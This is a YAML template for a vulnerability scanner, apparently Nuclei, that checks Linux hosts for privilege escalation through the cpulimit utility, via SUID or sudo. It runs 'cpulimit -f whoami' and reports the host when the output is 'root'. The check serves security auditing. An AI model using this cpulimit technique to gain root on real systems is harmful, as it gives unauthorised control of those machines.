id: privilege-escalation-cpulimit

info:
  name: CPUlimit - Privilege Escalation
  author: daffainfo
  severity: high
  reference: https://gtfobins.github.io/gtfobins/cpulimit/
  metadata:
    verified: true
  tags: code,linux,cpulimit,privesc

self-contained: true
code:
  - engine:
      - sh
      - bash
    source: |
        whoami

  #SUID
  - engine:
      - sh
      - bash
    source: |
        cpulimit -l 100 -f whoami

  #SUDO
  - engine:
      - sh
      - bash
    source: |
        sudo cpulimit -l 100 -f whoami

    matchers-condition: and
    matchers:
       - type: word
         part: code_1_response
         words:
           - "root"
         negative: true

      - type: dsl
        dsl:
          - 'contains(code_2_response, "root")'
          - 'contains(code_3_response, "root")'
        condition: or